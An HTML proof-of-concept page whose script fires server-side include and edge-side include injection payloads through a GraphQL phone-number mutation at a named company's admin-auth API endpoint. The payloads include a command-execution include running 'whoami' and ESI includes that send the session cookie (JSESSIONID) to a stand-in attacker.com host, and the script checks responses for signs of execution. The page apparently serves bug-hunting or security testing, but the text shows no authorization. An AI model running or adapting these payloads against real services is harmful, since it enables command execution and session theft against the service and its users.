<!DOCTYPE html>
<html>
<head>
    <title>Swan SSI Injection PoC</title>
</head>
<body>
    <h1>Swan SSI/ESI Injection Attack</h1>
    <button onclick="testSSIInjection()">Test SSI Injection</button>
    <div id="results"></div>

    <script>
        async function testSSIInjection() {
            const resultsDiv = document.getElementById('results');
            
            // SSI/ESI injection payloads
            const ssiPayloads = [
                '<!--#echo var="HTTP_COOKIE" -->',
                '<!--#exec cmd="whoami" -->',
                '<esi:include src=http://attacker.com/$(HTTP_COOKIE)>',
                '<!--esi-->test<!--/esi-->',
                '<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{\'JSESSIONID\'})" />',
                '<!--esi $(HTTP_COOKIE) -->',
                '<esi:debug/>'
            ];
            
            for (const payload of ssiPayloads) {
                try {
                    // Test in phone number field
                    const mutation = `
                        mutation {
                            startPhoneNumberModification(input:{
                                oldPhoneNumber:"${payload}",
                                newPhoneNumber:"+33612345678"
                            }) {
                                __typename
                            }
                        }
                    `;
                    
                    const response = await fetch('https://api.swan.io/admin-auth/graphql', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ query: mutation })
                    });
                    
                    const data = await response.json();
                    const responseText = JSON.stringify(data);
                    
                    resultsDiv.innerHTML += `
                        <h3>SSI Payload: ${payload}</h3>
                        <pre>${responseText}</pre>
                    `;
                    
                    // Check for SSI execution indicators
                    if (responseText.includes('root') || // Command execution
                        responseText.includes('HTTP_COOKIE') || // Variable disclosure
                        response.headers.get('surrogate-control')) { // ESI detection
                        alert('Potential SSI/ESI vulnerability detected!');
                    }
                    
                } catch (error) {
                    console.error('SSI test error:', error);
                }
            }
        }
    </script>
</body>
</html>
